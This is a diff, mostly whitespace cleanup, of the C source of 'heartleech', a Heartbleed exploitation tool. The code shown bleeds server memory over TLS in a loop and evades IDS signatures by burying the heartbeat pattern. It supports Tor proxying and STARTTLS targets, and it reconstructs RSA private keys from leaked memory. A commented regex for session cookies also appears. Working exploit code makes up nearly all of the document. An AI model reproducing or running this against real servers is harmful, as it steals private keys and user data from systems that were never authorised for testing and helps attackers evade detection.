@@ -1,40 +1,40 @@
 /*
-    
+
     HEARTLEECH
 
     A program for exploiting Neel Mehta's "HeartBleed" bug. This program has
     the following features:
- 
+
     [IDS-EVASION] Many IDSs trigger on the pattern |18 03| transmitted as the
-    first two bytes of the TCP payload. This program buries that pattern 
+    first two bytes of the TCP payload. This program buries that pattern
     deeper in the payload in the to-server direction, evading the IDS for
     incoming packets. However, it can't control the responses well, so
     IDSs will often detect responses in the from-server direction.
- 
+
     [SAFE/VULNERABLE/INCONCLUSIVE] When doing a `--scan` to simply test if the
-    target is vulnerable, system are only marked "SAFE" is the system knows 
+    target is vulnerable, system are only marked "SAFE" is the system knows
     for sure that they are safe, such as if they are patched or don't support
     heartbeats. Otherwise, systems are marked "INCONCLUSIVE" (or, of course,
     "VULNERABLE" if they respond with a bleed).
- 
+
     [ENCRYPTION] Most tools do heartbleeds during the handshake, unencrypted.
     This tool does the heartbleed post-handshake, when it's encrypted. This
     means this tool has to be compiled/linked with an OpenSSL library, which
     is the main difficulty using the tool.
- 
+
     [LOOPING] This tool doesn't do a single bleed, but loops doing the request
     over and over, generating large dump files that can be post-processed to
     find secrets.
- 
+
     [Socks5n] This tool supports the Socks5n proxying for use with Tor.
     It embeds the hostname inside the Socks protocol, meaning that no DNS
     lookup happens from this this machine. Instead, the Tor exit server is
     responsible for the DNS lookup.
- 
+
     [IPV6] This tool fully supports IPv6, including for such things as
     proxying. Indeed, if the an AAAA record is the first record to come
     back, then you may be using IPv6 without realizing it.
- 
+
     [ASYNC/MEM-BIO] Normally, OpenSSL takes care of the underlying sockets
     connections for you. In this program, in order to support things like
     IDS evasion, proxying, and STARTTLS, the program has to deal with sockets
@@ -253,7 +253,7 @@ struct TargetList {
 };
 
 /**
- * Which operation we are performing 
+ * Which operation we are performing
  */
 enum Operation {
     Op_None,
@@ -324,7 +324,7 @@ static void
 hexdump(const unsigned char *buf, size_t len)
 {
     size_t i;
-    
+
     for (i=0; i<len; i += 16) {
         size_t j;
 
@@ -354,7 +354,7 @@ struct pcre_extra;
 typedef struct pcre *(*PCRE_compile)(const char *pattern, int options,
                             const char **errptr, int *erroffset,
                             const unsigned char *tableptr);
-typedef int (*PCRE_exec)(const struct pcre *code, 
+typedef int (*PCRE_exec)(const struct pcre *code,
                 const struct pcre_extra *extra, const char *subject, int length,
                 int startoffset, int options, int *ovector, int ovecsize);
 typedef struct pcre_extra *(*PCRE_study)(const struct pcre *code, int options,
@@ -422,11 +422,11 @@ load_pcre(void)
 #elif defined(WIN32)
         "pcre3.dll",
 #else
-        "libpcre.dylib", 
+        "libpcre.dylib",
 #endif
         0 };
     size_t i;
-    
+
     /* look for a PCRE library */
     for (i=0; library_names[i]; i++) {
         h = dlopen(library_names[i], RTLD_LAZY);
@@ -438,7 +438,7 @@ load_pcre(void)
     }
     if (h == NULL)
         return;
-    
+
     /* load symbols */
     PCRE.compile = (PCRE_compile)dlsym(h, "pcre_compile");
     if (PCRE.compile == NULL) {
@@ -460,21 +460,21 @@ load_pcre(void)
         perror("pcre_version");
         return;
     }
-    
+
     fprintf(stderr, "PCRE library: %s\n", PCRE.version());
 }
 
 
 
 /******************************************************************************
- * This is the "callback" that receives the hearbeat data. Since 
+ * This is the "callback" that receives the hearbeat data. Since
  * hearbeat is a control function and not part of the normal data stream
  * it can't be read normally. Instead, we have to install a hook within
  * the OpenSSL core to intercept them.
  ******************************************************************************/
-static void 
+static void
 receive_heartbeat(int write_p, int version, int content_type,
-            const void *vbuf, size_t len, SSL *ssl, 
+            const void *vbuf, size_t len, SSL *ssl,
             void *arg)
 {
     struct Connection *connection = (struct Connection *)arg;
@@ -518,13 +518,13 @@ receive_heartbeat(int write_p, int version, int content_type,
     /* Record how many bytes we've received, so that we can known when we've
      * received all the heartbeat */
     connection->event.bytes_received += len;
-    
+
     /*
      * See if this is a "good" heartbeat, which we send to probe
      * the system in order to see if it's been patched.
      */
     if (connection->is_sent_good_heartbeat && len == 67) {
-        static const char *good_response = 
+        static const char *good_response =
             "\x02\x00\x18"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa"
@@ -578,7 +578,7 @@ my_inet_ntop(struct sockaddr *sa, char *dst, size_t sizeof_dst)
         DWORD len = (DWORD)sizeof_dst;
         WSAAddressToStringA(sa, sizeof(struct sockaddr_in6), NULL,
                             dst, &len);
-    }    
+    }
 #else
     switch (sa->sa_family) {
     case AF_INET:
@@ -637,7 +637,7 @@ x_inet_pton(int family, const char *hostname, struct sockaddr *sa)
  * it's not a general purpose function.
  ******************************************************************************/
 static size_t
-my_inet_pton(const char *hostname, 
+my_inet_pton(const char *hostname,
                 unsigned char *dst, size_t offset, size_t max,
                 unsigned char *type)
 {
@@ -655,13 +655,13 @@ my_inet_pton(const char *hostname,
         }
     }
 #else
-    if (max-offset >= 4 
+    if (max-offset >= 4
         && inet_pton(AF_INET, hostname, &dst[offset]) == 1) {
         *type = 1; /* socks5 type = IPv4 */
         return offset + 4;
     }
 #endif
-    
+
 #if defined(WIN32)
     if (max-offset >= 16) {
         struct sockaddr_in6 sin6;
@@ -672,7 +672,7 @@ my_inet_pton(const char *hostname,
         }
     }
 #else
-    if (max-offset >= 16 
+    if (max-offset >= 16
         && inet_pton(AF_INET6, hostname, &dst[offset]) == 1) {
         *type = 4; /* socks5 type = IPv6*/
         return offset + 16;
@@ -717,7 +717,7 @@ rsa_gen(const BIGNUM *p, const BIGNUM *q, const BIGNUM *e)
     BN_init(q1);
     BN_init(r);
 
-	rsa->p = BN_new();
+    rsa->p = BN_new();
     BN_copy(rsa->p, p);
     rsa->q = BN_new();
     BN_copy(rsa->q, q);
@@ -726,31 +726,31 @@ rsa_gen(const BIGNUM *p, const BIGNUM *q, const BIGNUM *e)
 
     /*
      * n - modulus (should be same as original cert, but we
-     * recalculate it here 
+     * recalculate it here
      */
     rsa->n = BN_new();
     BN_mul(rsa->n, rsa->p, rsa->q, ctx);
 
     /*
-     * d - the private exponent 
+     * d - the private exponent
      */
     rsa->d = BN_new();
     BN_sub(p1, rsa->p, BN_value_one());
     BN_sub(q1, rsa->q, BN_value_one());
     BN_mul(r,p1,q1,ctx);
-	BN_mod_inverse(rsa->d, rsa->e, r, ctx);
+    BN_mod_inverse(rsa->d, rsa->e, r, ctx);
 
     /* calculate d mod (p-1) */
     rsa->dmp1 = BN_new();
-	BN_mod(rsa->dmp1, rsa->d, rsa->p, ctx);
+    BN_mod(rsa->dmp1, rsa->d, rsa->p, ctx);
 
     /* calculate d mod (q-1) */
     rsa->dmq1 = BN_new();
-	BN_mod(rsa->dmq1, rsa->d, rsa->q, ctx);
+    BN_mod(rsa->dmq1, rsa->d, rsa->q, ctx);
 
-  	/* calculate inverse of q mod p */
+    /* calculate inverse of q mod p */
     rsa->iqmp = BN_new();
-  	BN_mod_inverse(rsa->iqmp, rsa->q, rsa->p, ctx);
+    BN_mod_inverse(rsa->iqmp, rsa->q, rsa->p, ctx);
 
 
 
@@ -768,7 +768,7 @@ rsa_gen(const BIGNUM *p, const BIGNUM *q, const BIGNUM *e)
  * of the public key
  ******************************************************************************/
 static int
-find_private_key(const BIGNUM n, const BIGNUM e, 
+find_private_key(const BIGNUM n, const BIGNUM e,
                  const unsigned char *buf, size_t buf_length)
 {
     size_t i;
@@ -799,7 +799,7 @@ find_private_key(const BIGNUM n, const BIGNUM e,
         p.d = (BN_ULONG*)(buf+i);
         p.dmax = n.top/2;
         p.top = p.dmax;
-        
+
         /* [optimization] Only process odd numbers, because even numbers
          * aren't prime. This doubles the speed. */
         if (!(p.d[0]&1))
@@ -853,7 +853,7 @@ find_private_key(const BIGNUM n, const BIGNUM e,
  *  3. hexdump to the command-line
  ******************************************************************************/
 static size_t
-process_bleed(const struct DumpArgs *args_in, 
+process_bleed(const struct DumpArgs *args_in,
               const unsigned char *buf, size_t buf_size,
               BIGNUM n, BIGNUM e)
 {
@@ -885,7 +885,7 @@ process_bleed(const struct DumpArgs *args_in,
         }
 
     }
-    
+
     return buf_size;
 }
 
@@ -908,7 +908,7 @@ parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
     subj = X509_get_subject_name(cert);
     if (subj) {
         int len;
-        len = X509_NAME_get_text_by_NID(subj, NID_commonName, 
+        len = X509_NAME_get_text_by_NID(subj, NID_commonName,
                                         name, 512);
         if (len > 0) {
             name[255] = '\0';
@@ -923,7 +923,7 @@ parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
         BIGNUM *n = rsakey->pkey.rsa->n;
         memcpy(modulus, n, sizeof(*modulus));
         memcpy(e, rsakey->pkey.rsa->e, sizeof(*e));
-        DEBUG_MSG("[+] RSA public-key length = %u-bits\n", 
+        DEBUG_MSG("[+] RSA public-key length = %u-bits\n",
                                     n->top * sizeof(BN_ULONG) * 8);
     }
 }
@@ -983,7 +983,7 @@ is_incoming_data(int fd)
  * use with Tor
  ******************************************************************************/
 static int
-proxy_handshake(int fd, 
+proxy_handshake(int fd,
                 const struct DumpArgs *args, const struct Target *target)
 {
     unsigned char foo[512];
@@ -993,12 +993,12 @@ proxy_handshake(int fd,
     time_t start_time;
     int x;
 
-    /* 
-     * negotiate version=5, passwords=none 
+    /*
+     * negotiate version=5, passwords=none
      */
     x = send(fd, "\x05\x01\x00", 3, MSG_NOSIGNAL);
     if (x < 3) {
-        ERROR_MSG("[-] proxy handshake: %s (%u)\n", 
+        ERROR_MSG("[-] proxy handshake: %s (%u)\n",
             error_msg(WSAGetLastError()), WSAGetLastError());
         return -1;
     }
@@ -1015,7 +1015,7 @@ proxy_handshake(int fd,
     }
     x = recv(fd, (char*)foo, 2, 0);
     if (x != 2) {
-        ERROR_MSG("[-] proxy handshake: %s (%u)\n", 
+        ERROR_MSG("[-] proxy handshake: %s (%u)\n",
             error_msg(WSAGetLastError()), WSAGetLastError());
         return -1;
     }
@@ -1032,8 +1032,8 @@ proxy_handshake(int fd,
         return -1;
     }
 
-    /* 
-     * send connect requrest 
+    /*
+     * send connect requrest
      */
     foo[0] = 5; /*version = socks5 */
     foo[1] = 1; /*cmd = connect*/
@@ -1045,7 +1045,7 @@ proxy_handshake(int fd,
     }
     x = send(fd, (char*)foo, offset, MSG_NOSIGNAL);
     if (x != offset) {
-        ERROR_MSG("[-] proxied connect: %s (%u)\n", 
+        ERROR_MSG("[-] proxied connect: %s (%u)\n",
             error_msg(WSAGetLastError()), WSAGetLastError());
         return -1;
     }
@@ -1062,7 +1062,7 @@ proxy_handshake(int fd,
     }
     x = recv(fd, (char*)foo, sizeof(foo), 0);
     if (x == 0) {
-        ERROR_MSG("[-] proxied connect: %s (%u)\n", 
+        ERROR_MSG("[-] proxied connect: %s (%u)\n",
             error_msg(WSAGetLastError()), WSAGetLastError());
         return -1;
     }
@@ -1091,7 +1091,7 @@ proxy_handshake(int fd,
     }
 
     switch (foo[3]) {
-    case 1: 
+    case 1:
         if (x != 10) {
             ERROR_MSG("[-] proxy returned unexpected data\n");
             ERROR_MSG("[-] %02x:%02x:%02x:%02x:%02x\n",
@@ -1102,7 +1102,7 @@ proxy_handshake(int fd,
             sin.sin_family = AF_INET;
             memcpy(&sin.sin_addr, foo+4, 4);
             memcpy(&sin.sin_port, foo+8, 2);
-            my_inet_ntop((struct sockaddr*)&sin, 
+            my_inet_ntop((struct sockaddr*)&sin,
                          proxy_address, sizeof(proxy_address));
         }
         break;
@@ -1117,7 +1117,7 @@ proxy_handshake(int fd,
             sin6.sin6_family = AF_INET;
             memcpy(&sin6.sin6_addr, foo+4, 4);
             memcpy(&sin6.sin6_port, foo+8, 2);
-            my_inet_ntop((struct sockaddr*)&sin6, 
+            my_inet_ntop((struct sockaddr*)&sin6,
                          proxy_address, sizeof(proxy_address));
         }
         break;
@@ -1138,7 +1138,7 @@ proxy_handshake(int fd,
         return -1;
     }
 
-    DEBUG_MSG("[+] proxy connected through: %s:%u\n", 
+    DEBUG_MSG("[+] proxy connected through: %s:%u\n",
                                                     proxy_address, proxy_port);
     return 0;
 }
@@ -1147,8 +1147,8 @@ proxy_handshake(int fd,
 /******************************************************************************
  ******************************************************************************/
 static int
-recv_line(  int fd, 
-            unsigned char *line, unsigned *offset, unsigned max, 
+recv_line(  int fd,
+            unsigned char *line, unsigned *offset, unsigned max,
             unsigned timeout)
 {
     time_t start_time = time(0);
@@ -1190,7 +1190,7 @@ recv_line(  int fd,
 /******************************************************************************
  ******************************************************************************/
 static int
-starttls_smtp(int fd, 
+starttls_smtp(int fd,
                 const struct DumpArgs *args, const struct Target *target)
 {
     unsigned char line[2048];
@@ -1263,7 +1263,7 @@ starttls_smtp(int fd,
 /******************************************************************************
  ******************************************************************************/
 static int
-starttls_ftp(int fd, 
+starttls_ftp(int fd,
                 const struct DumpArgs *args, const struct Target *target)
 {
     unsigned char line[2048];
@@ -1335,7 +1335,7 @@ contains(const unsigned char line[], size_t length, const char substring[])
 /******************************************************************************
  ******************************************************************************/
 static int
-starttls_imap4(int fd, 
+starttls_imap4(int fd,
                 const struct DumpArgs *args, const struct Target *target)
 {
     unsigned char line[2048];
@@ -1350,14 +1350,14 @@ starttls_imap4(int fd,
         return x;
     DEBUG_MSG("[+] %.*s", offset, line);
 
-    
+
     /* send greetings */
     if (send(fd, "efgh STARTTLS\r\n", 15, MSG_NOSIGNAL) != 15) {
         ERROR_MSG("[-] starttls handshake: network error\n");
         return -1;
     }
 
-    
+
     /* grab their response */
     offset = 0;
     x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
@@ -1378,7 +1378,7 @@ starttls_imap4(int fd,
 /******************************************************************************
  ******************************************************************************/
 static int
-starttls_pop3(int fd, 
+starttls_pop3(int fd,
                 const struct DumpArgs *args, const struct Target *target)
 {
     unsigned char line[2048];
@@ -1396,14 +1396,14 @@ starttls_pop3(int fd,
         ERROR_MSG("[-] starttls handshake: unexpected data\n");
     }
 
-    
+
     /* send greetings */
     if (send(fd, "STLS\r\n", 6, MSG_NOSIGNAL) != 6) {
         ERROR_MSG("[-] starttls handshake: network error\n");
         return -1;
     }
 
-    
+
     /* grab their response */
     offset = 0;
     x = recv_line(fd, line, &offset, sizeof(line), args->timeout);
@@ -1465,7 +1465,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     }
 
 
-    
+
     /*
      * Do the DNS lookup. A hostname may have multiple IP addresses, so we
      * print them all for debugging purposes. Normally, we'll just pick
@@ -1492,8 +1492,8 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
         return ERROR_MSG("IPv%u address not found\n", args->ip_ver);
     my_inet_ntop(addr->ai_addr, address, sizeof(address));
 
-    
-    
+
+
     /*
      * Create a normal TCP socket
      */
@@ -1506,7 +1506,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
         setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, (void *)&set, sizeof(int));
     }
 #endif
-    
+
     /*
      * Do a normal TCP connect to the target IP address, sending a SYN and
      * so on
@@ -1515,7 +1515,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     x = connect(fd, addr->ai_addr, (int)addr->ai_addrlen);
     if (x != 0) {
         target->scan_result = Verdict_Inconclusive_NoTcp;
-        ERROR_MSG("[-] %s: connect failed: %s (%u)\n", 
+        ERROR_MSG("[-] %s: connect failed: %s (%u)\n",
             address, error_msg(WSAGetLastError()), WSAGetLastError());
         if (target->loop.done == 0)
             target->loop.desired = 0;
@@ -1536,8 +1536,8 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
             goto end;
         }
     }
-    
-    
+
+
     /*
      * If doing STARTTLS, do the negotiation now.
      */
@@ -1582,9 +1582,9 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
             target->loop.desired = 0;
         goto end;
     }
-    
-    
-    /* 
+
+
+    /*
      * Initialize SSL structures. Specifically, we initialize them with
      * "memory" BIO instead of normal "socket" BIO, because we are handling
      * the socket communications ourselves, and are just using BIO to
@@ -1600,13 +1600,13 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
     SSL_set_msg_callback(ssl, receive_heartbeat);
     SSL_set_msg_callback_arg(ssl, (void*)&connection);
     connection->is_alert = 0;
-    
-    
-    /* 
+
+
+    /*
      * SSL handshake (rerouting the encryptions). This is an ASYNCHROUNOUS
      * technique using our own sockets and "memory BIO". It's not the normal
      * use of the API that you'd expect. We have to do do the send()/recv()
-     * ourselves on sockets, then pass then through to the SSL layer 
+     * ourselves on sockets, then pass then through to the SSL layer
      */
     DEBUG_MSG("[ ] SSL handshake started...\n");
     target->scan_result = Verdict_Inconclusive_NoSsl;
@@ -1632,7 +1632,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
             x = send(fd, buf, (int)len, MSG_NOSIGNAL);
             if (x <= 0) {
                 unsigned err = WSAGetLastError();
-                ERROR_MSG("[-] %s:%s send fail: %s (%u)\n", 
+                ERROR_MSG("[-] %s:%s send fail: %s (%u)\n",
                           address, port, error_msg(err), err);
                 goto end;
             }
@@ -1663,7 +1663,7 @@ ssl_thread(const struct DumpArgs *args, struct Target *target)
                 }
             }
         } else {
-            ERROR_MSG("[-] %s:%s: SSL handshake failed: %d\n", 
+            ERROR_MSG("[-] %s:%s: SSL handshake failed: %d\n",
                                      address, port, SSL_get_error(ssl, 0));
             if (target->loop.done <= 1)
                 target->loop.desired = 0;
@@ -1715,7 +1715,7 @@ again:
         DEBUG_MSG("[-] loop-count = 0\n");
         goto end;
     }
-        
+
 
     /*
      * Print how many bytes we've downloaded on command-line every
@@ -1734,10 +1734,10 @@ again:
     if (connection->buf_count) {
         process_bleed(args, connection->buf, connection->buf_count,
                       connection->n, connection->e);
-        connection->buf_count = 0;        
+        connection->buf_count = 0;
     }
 
-    /* 
+    /*
      * [IDS-EVASION]
      *  In order to evade detection, we prefix the heartbeat request with
      *  some other data. This can either be an "Alert/Warning" at the SSL
@@ -1746,50 +1746,50 @@ again:
      */
     switch (target->application) {
     case APP_HTTP:
-        ssl3_write_bytes(ssl, 
-                         SSL3_RT_APPLICATION_DATA, 
-                         target->http_request, 
+        ssl3_write_bytes(ssl,
+                         SSL3_RT_APPLICATION_DATA,
+                         target->http_request,
                          (int)strlen(target->http_request));
         break;
     case APP_SMTP:
-        ssl3_write_bytes(ssl, 
-                         SSL3_RT_APPLICATION_DATA, 
+        ssl3_write_bytes(ssl,
+                         SSL3_RT_APPLICATION_DATA,
                          "NOOP\r\n",
                          6);
         break;
     case APP_POP3:
-        ssl3_write_bytes(ssl, 
-                         SSL3_RT_APPLICATION_DATA, 
+        ssl3_write_bytes(ssl,
+                         SSL3_RT_APPLICATION_DATA,
                          "STAT\r\n",
                          6);
-        break;        
+        break;
     case APP_IMAP4:
-        ssl3_write_bytes(ssl, 
-                         SSL3_RT_APPLICATION_DATA, 
+        ssl3_write_bytes(ssl,
+                         SSL3_RT_APPLICATION_DATA,
                          "a001 CAPABILITY\r\n",
                          17);
         break;
     default:
-        /*ssl3_write_bytes(ssl, 
-                         SSL3_RT_ALERT, 
+        /*ssl3_write_bytes(ssl,
+                         SSL3_RT_ALERT,
                          "\x15\x03\x02\x00\x02\x01\x2e",
                          7);*/
         break;
     }
-    
+
     /*
      * [HEARTBEAT]
-     *  Here is where we send the heartbeat request. This is normally a 
+     *  Here is where we send the heartbeat request. This is normally a
      *  "bleed" request, but if we haven't gotten any bleed responses, we'll
      *  instead send a "beat" request. A system that responses to beats but
      *  not bleeds is almost certainly patched.
      */
-    if (connection->heartbleeds.attempted > 1 
+    if (connection->heartbleeds.attempted > 1
         && connection->heartbleeds.succeeded == 0) {
         /* we've sent a heartbleeds with no response, therefore try a
          * normal heartbeat */
         connection->is_sent_good_heartbeat = 1;
-        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, 
+        ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT,
             "\x01\x00\x12"
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa"
@@ -1831,7 +1831,7 @@ again:
 
 
 
-    /* 
+    /*
      * Transmit both requests (data and heartbeat) in the same packet
      */
     DEBUG_MSG("[ ] transmitting requests\n");
@@ -1842,7 +1842,7 @@ again:
         x = send(fd, buf, (int)len, MSG_NOSIGNAL);
         if (x <= 0) {
             unsigned err = WSAGetLastError();
-            ERROR_MSG("[-] %s:%s send fail: %s (%u)\n", 
+            ERROR_MSG("[-] %s:%s send fail: %s (%u)\n",
                       address, port, error_msg(err), err);
             goto end;
         }
@@ -1861,7 +1861,7 @@ again:
         /* if we can an ALERT at the SSL layer, break out of this loop */
         if (connection->is_alert)
             goto end;
-        
+
         /* only wait a few seconds for a response */
         if (started + args->timeout < time(0)) {
             DEBUG_MSG("[-] timeout waiting for response\n");
@@ -1915,7 +1915,7 @@ again:
         }
     }
     goto again;
-    
+
     /*
      * We've either reached our loop limit or the other side closed the
      * connection
@@ -1943,9 +1943,9 @@ scan_patterns(const struct DumpArgs *args, const unsigned char *buf, size_t buf_
         int j;
         int ovector[1024*3];
 
-        x = PCRE.exec(args->patterns.pat[i], 
+        x = PCRE.exec(args->patterns.pat[i],
                         args->patterns.extra[i],
-                        buf, buf_size, 0, 0, 
+                        (char*)buf, buf_size, 0, 0,
                         ovector, 1024*3);
         for (j=0; j<x; j++) {
             int k;
@@ -1966,7 +1966,7 @@ scan_patterns(const struct DumpArgs *args, const unsigned char *buf, size_t buf_
  * the private key in the given certificate.
  ******************************************************************************/
 static void
-process_offline_file(const struct DumpArgs *args, 
+process_offline_file(const struct DumpArgs *args,
                         const char *filename_cert, const char *filename_bin)
 {
     FILE *fp;
@@ -1987,11 +1987,11 @@ process_offline_file(const struct DumpArgs *args,
             return;
         }
         cert = PEM_read_X509(fp, NULL, NULL, NULL);
-	    if (cert == NULL) {
-		    fprintf(stderr, "%s: error parsing certificate\n", filename_cert);
-		    fclose(fp);
-		    return;
-	    }
+        if (cert == NULL) {
+            fprintf(stderr, "%s: error parsing certificate\n", filename_cert);
+            fclose(fp);
+            return;
+        }
         fclose(fp);
         parse_cert(cert, name, &n, &e);
     }
@@ -2033,9 +2033,9 @@ process_offline_file(const struct DumpArgs *args,
     fclose(fp);
 
 
-	
-	end:
-	X509_free(cert);
+
+    end:
+    X509_free(cert);
 }
 
 
@@ -2078,7 +2078,7 @@ initialize_http(const struct Target *target)
      * Format the HTTP request. We need to stick the "Host:" header in
      * the correct place in the header
      */
-    static const char *prototype = 
+    static const char *prototype =
     "GET / HTTP/1.1\r\n"
     "Host: \r\n"
     "User-agent: test/1.0\r\n"
@@ -2088,13 +2088,13 @@ initialize_http(const struct Target *target)
     char *request;
     const char *hostname = target->hostname;
     size_t hostname_length = strlen(hostname);
-    
+
     request = (char*)malloc(strlen(prototype) + hostname_length + 1);
     memcpy(request, prototype, strlen(prototype) + 1);
     prefix = strstr(prototype, "Host: ") - prototype + 6;
     memcpy(request + prefix, hostname, hostname_length);
-    memcpy(request + prefix + hostname_length, 
-           prototype + prefix, 
+    memcpy(request + prefix + hostname_length,
+           prototype + prefix,
            strlen(prototype+prefix) + 1);
     return request;
 }
@@ -2110,22 +2110,22 @@ add_target(struct TargetList *targets, const char *hostname)
     unsigned port_index;
     unsigned host_index = 0;
     unsigned host_length;
-    
+
     /* Expand the list to accomodate the new target */
     if (targets->count + 1 >= targets->max) {
         size_t new_max = targets->max * 2 + 1;
         if (targets->list) {
             targets->list = (struct Target*)realloc(
-                                        targets->list, 
+                                        targets->list,
                                         new_max * sizeof(targets->list[0]));
         } else {
             targets->list = (struct Target*)malloc(
                                         new_max * sizeof(targets->list[0]));
-            
+
         }
         targets->max = new_max;
     }
-    
+
     /* add the target */
     target = &targets->list[targets->count++];
     memset(target, 0, sizeof(*target));
@@ -2139,11 +2139,11 @@ add_target(struct TargetList *targets, const char *hostname)
     else
         port_index = strlen(hostname);
     host_length = port_index - host_index;
-    
+
     target->hostname = (char*)malloc(host_length + 1);
     memcpy(target->hostname, &hostname[host_index], host_length + 1);
     target->hostname[host_length] = '\0';
-    
+
     /* parse port */
     while (hostname[port_index] && ispunct(hostname[port_index]&0xFF))
         port_index++;
@@ -2159,7 +2159,7 @@ add_target(struct TargetList *targets, const char *hostname)
  * variables, and so forth.
  ******************************************************************************/
 static unsigned
-heartleech_set_parameter(struct DumpArgs *args, 
+heartleech_set_parameter(struct DumpArgs *args,
                             const char name[], const char value[])
 {
     if (EQUALS("autopwn", name)) {
@@ -2167,7 +2167,7 @@ heartleech_set_parameter(struct DumpArgs *args,
         return 0;
     } else if (EQUALS("cert", name)) {
         if (args->cert_filename) {
-            fprintf(stderr, "certificate file already specified: %s\n", 
+            fprintf(stderr, "certificate file already specified: %s\n",
                     args->cert_filename);
             free(args->cert_filename);
         }
@@ -2176,7 +2176,7 @@ heartleech_set_parameter(struct DumpArgs *args,
         return 1;
     } else if (EQUALS("dump", name)) {
         if (args->dump_filename) {
-            fprintf(stderr, "dump file already specified: %s\n", 
+            fprintf(stderr, "dump file already specified: %s\n",
                     args->dump_filename);
             free(args->dump_filename);
         }
@@ -2254,7 +2254,7 @@ heartleech_set_parameter(struct DumpArgs *args,
         return 0; /* no 'value' argument */
     } else if (EQUALS("read", name)) {
         if (args->offline_filename) {
-            fprintf(stderr, "[-] offline file already specified: %s\n", 
+            fprintf(stderr, "[-] offline file already specified: %s\n",
                     args->offline_filename);
             free(args->offline_filename);
         }
@@ -2317,9 +2317,9 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
     for (i=1; i<argc; i++) {
         char c;
         const char *arg;
-        
-        /* 
-         * --longform parameters 
+
+        /*
+         * --longform parameters
          */
         if (argv[i][0] == '-' && argv[i][1] == '-') {
             if (strchr(argv[i], '='))
@@ -2340,7 +2340,7 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
             }
             continue;
         }
-        
+
         /* All parameters start with the standard '-'. If it doesn't, then
          * it's assumed to be the target. Only one target can be specified
          * on the commandline -- when scanning many targets, they must come
@@ -2349,8 +2349,8 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
             heartleech_set_parameter(args, "target", argv[i]);
             continue;
         }
-        
-        /* 
+
+        /*
          * parameters can be either of two ways:
          * -twww.google.com
          * -t www.google.com
@@ -2366,7 +2366,7 @@ read_configuration(struct DumpArgs *args, int argc, char *argv[])
             }
         } else
             arg = argv[i] + 2;
-        
+
         /*
          * Get the parameter
          */
@@ -2397,26 +2397,26 @@ static void
 run_scan(const struct DumpArgs *args, size_t start, size_t stop)
 {
     size_t i;
-    
-    
+
+
     for (i=start; i<stop; i++) {
         struct Target target;
         unsigned is_starttls = 0;
 
         target = args->targets.list[i];
-        
+
         target.loop.desired = args->cfg_loopcount;
-        
+
         if (target.port > 65535)
             target.port = args->default_port;
-        
+
         target.application = port_to_app(target.port, &is_starttls);
         if (is_starttls)
             target.starttls = target.application;
-        
+
         if (target.application == APP_HTTP)
             target.http_request = initialize_http(&target);
-        
+
         /*
          * Now run the thread
          */
@@ -2426,42 +2426,42 @@ run_scan(const struct DumpArgs *args, size_t start, size_t stop)
             if (x < 0)
                 break;
         }
-        
+
         /*
          * Print verdict, if doing a scan
          */
         if (args->is_scan) {
             switch (target.scan_result) {
                 case Verdict_Safe:
-                    printf("%s:%u: SAFE\n", 
+                    printf("%s:%u: SAFE\n",
                            target.hostname, target.port);
                     break;
                 case Verdict_Vulnerable:
-                    printf("%s:%u: VULNERABLE\n", 
+                    printf("%s:%u: VULNERABLE\n",
                            target.hostname, target.port);
                     break;
                 case Verdict_Inconclusive_NoDNS:
-                    printf("%s:%u: INCONCLUSIVE: DNS failed\n", 
+                    printf("%s:%u: INCONCLUSIVE: DNS failed\n",
                            target.hostname, target.port);
                     break;
                 case Verdict_Inconclusive_NoTcp:
-                    printf("%s:%u: INCONCLUSIVE: TCP connect failed\n", 
+                    printf("%s:%u: INCONCLUSIVE: TCP connect failed\n",
                            target.hostname, target.port);
                     break;
                 case Verdict_Inconclusive_NoSsl:
-                    printf("%s:%u: INCONCLUSIVE: SSL handshake failed\n", 
+                    printf("%s:%u: INCONCLUSIVE: SSL handshake failed\n",
                            target.hostname, target.port);
                     break;
                 default:
-                    printf("%s:%u: INCONCLUSIVE\n", 
+                    printf("%s:%u: INCONCLUSIVE\n",
                            target.hostname, target.port);
                     break;
             }
         }
-        
+
         if (target.http_request)
             free(target.http_request);
-    }    
+    }
 }
 
 /******************************************************************************
@@ -2484,7 +2484,7 @@ main(int argc, char *argv[])
     //pattern_add(&args.patterns, "[a-zA-Z]*[sS][eE][sS][sS][iI][oO][nN][a-zA-Z0-9=]*;");
     //pattern_add(&args.patterns, "ASPSESSION[A-Z]*=[A-Z]*;");
 
-    
+
     /*
      * Print usage information
      */
@@ -2517,7 +2517,7 @@ main(int argc, char *argv[])
     OpenSSL_add_all_algorithms();
 
     /*
-     * Verify that we have the proper version of the OpenSSL library. 
+     * Verify that we have the proper version of the OpenSSL library.
      * Heartbeats weren't enabled until version 1.0.1, so if we accidentally
      * link to an earlier library, the program will work but will ignore the
      * returned heartbeat information. This happens in places like Mac OS X,
@@ -2530,14 +2530,14 @@ main(int argc, char *argv[])
         ERROR_MSG("[-] must link to OpenSSL/1.0.1a or later\n");
         exit(1);
     }
-    DEBUG_MSG("[+] local OpenSSL 0x%x(%s)\n", 
+    DEBUG_MSG("[+] local OpenSSL 0x%x(%s)\n",
               SSLeay(), SSLeay_version(SSLEAY_VERSION));
-    
+
     /*
      * Read in the configuration information
      */
     read_configuration(&args, argc, argv);
-    
+
     /*
      * Open the output/dump file.
      */
@@ -2557,7 +2557,7 @@ main(int argc, char *argv[])
         case Op_Error:
         default:
             goto usage;
-            
+
         case Op_Dump:
         case Op_Scan:
             if (args.targets.count == 0) {
@@ -2566,7 +2566,7 @@ main(int argc, char *argv[])
             }
